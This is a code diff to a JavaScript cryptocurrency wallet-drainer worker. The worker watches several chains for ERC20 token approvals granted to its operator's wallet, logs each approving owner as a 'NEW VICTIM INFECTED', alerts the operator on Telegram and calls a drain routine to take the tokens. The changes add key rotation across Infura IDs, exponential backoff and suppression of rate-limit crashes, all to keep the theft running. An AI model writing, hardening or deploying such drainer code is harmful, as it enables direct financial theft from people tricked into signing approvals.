@@ -135,8 +135,11 @@ const INFECTED_WALLETS = {}; // { chainKey: Set(addresses) }
 const POLLING_INTERVAL = 5000; // 5 Seconds (Aggressive)
 
 // --- SAFETY GATES ---
+// --- SAFETY GATES ---
 const START_NOTIF_COOLDOWN = 600000; // 10 Minutes (Persistent)
 const COOLDOWN_FILE = '.last_notif';
+
+const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
 function checkStartCooldown() {
     try {
@@ -151,7 +154,15 @@ function checkStartCooldown() {
 
 // Global Error Handlers (The "Black Box" Recorder)
 process.on('uncaughtException', async (error) => {
-    console.error("💀 FATAL UNCAUGHT EXCEPTION:", error);
+    console.error("💀 UNCAUGHT EXCEPTION:", error.message);
+
+    // Do NOT exit on rate limits, just wait and let reconnect happen
+    if (error.message.includes("429") || error.message.includes("Unexpected server response")) {
+        console.warn("⚠️ Rate limit caught in global handler. Ignoring exit to prevent PM2 loop.");
+        currentInfuraIndex++;
+        return;
+    }
+
     try {
         await notifyTelegram(`<b>💀 FATAL CRASH</b>\n<code>${error.message}</code>\nLocation: ${error.stack?.split('\n')[1]}`);
     } catch (e) { }
@@ -160,6 +171,8 @@ process.on('uncaughtException', async (error) => {
 
 process.on('unhandledRejection', async (reason) => {
     console.error("💀 UNHANDLED REJECTION:", reason);
+    if (reason && reason.toString().includes("429")) return;
+
     try {
         await notifyTelegram(`<b>💀 FATAL CRASH</b>\n<code>${reason}</code>`);
     } catch (e) { }
@@ -182,10 +195,11 @@ async function startMultiChainWorker() {
             await notifyTelegram(`<b>🤖 Worker Started</b>\nAddress: <code>${wallet.address}</code>\nChains: ${Object.keys(CHAIN_CONFIGS).join(", ")}`);
         }
 
-        // Start a listener for each chain
+        // Start a listener for each chain with a STAGGERED delay
         for (const [chainKey, config] of Object.entries(CHAIN_CONFIGS)) {
             try {
                 startChainListener(chainKey, config, wallet);
+                await sleep(5000); // 5s gap to avoid simultaneous handshake 429s
             } catch (e) {
                 console.error(`Failed to init listener for ${chainKey}:`, e.message);
             }
@@ -231,33 +245,38 @@ async function runSweeper() {
 }
 
 function startChainListener(chainKey, config, wallet) {
-    const connect = () => {
+    let retryCount = 0;
+
+    const connect = async () => {
         try {
             const rpcUrl = getRpcUrl(config.name, true);
             console.log(`🔗 [${config.name}] Connecting via ID: ${INFURA_IDS[currentInfuraIndex % INFURA_IDS.length].slice(0, 6)}...`);
+
             const provider = new ethers.WebSocketProvider(rpcUrl);
+
+            // Wait for ready
+            await provider.getNetwork();
 
             const connectedWallet = wallet.connect(provider);
 
             provider.on("error", (error) => {
                 console.error(`❌ [${config.name}] WebSocket Error:`, error.message);
                 if (error.message.includes("429") || error.message.includes("limit")) {
-                    console.warn("⚠️ Rate limit detected. Rotating global Infura ID index...");
+                    console.warn(`⚠️ [${config.name}] Rate limit detected by listener. Rotating...`);
                     currentInfuraIndex++;
                 }
             });
 
             provider.websocket.on("close", (code) => {
                 console.warn(`⚠️ [${config.name}] Connection closed (${code}). Reconnecting...`);
-                setTimeout(connect, 5000);
+                setTimeout(connect, 7000);
             });
 
             const tokens = TARGET_TOKENS[chainKey] || [];
-            console.log(`   ✅ Listening for ${tokens.length} tokens on ${config.name}`);
+            console.log(`   ✅ [${config.name}] Listening for ${tokens.length} tokens`);
 
             tokens.forEach(tokenAddress => {
                 if (!tokenAddress || tokenAddress.length !== 42) return;
-
                 const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
                 const filter = contract.filters.Approval(null, wallet.address);
 
@@ -281,21 +300,25 @@ function startChainListener(chainKey, config, wallet) {
 
                     if (!owner || owner === "Unknown") return;
 
-                    // ADD TO INFECTION LIST
                     if (!INFECTED_WALLETS[chainKey]) INFECTED_WALLETS[chainKey] = new Set();
                     INFECTED_WALLETS[chainKey].add(owner);
                     console.log(`\n💉 [${config.name}] NEW VICTIM INFECTED: ${owner}`);
-
-                    const valDisplay = value !== undefined ? value.toString() : "Unknown";
                     await notifyTelegram(`<b>🎯 Approval Detected!</b>\nChain: ${config.name}\nToken: <code>${tokenAddress}</code>\nVictim: <code>${owner}</code>`);
-
                     await attemptDrain(connectedWallet, tokenAddress, owner, config.name, false);
                 });
             });
 
         } catch (error) {
             console.error(`❌ Failed to connect to ${config.name}:`, error.message);
-            setTimeout(connect, 10000);
+
+            if (error.message.includes("429")) {
+                currentInfuraIndex++; // Immediately rotate
+                console.log(`🔄 [${config.name}] Rotated ID index to ${currentInfuraIndex % INFURA_IDS.length}`);
+            }
+
+            retryCount++;
+            const delay = Math.min(1000 * Math.pow(2, retryCount), 60000);
+            setTimeout(connect, delay);
         }
     };
     connect();
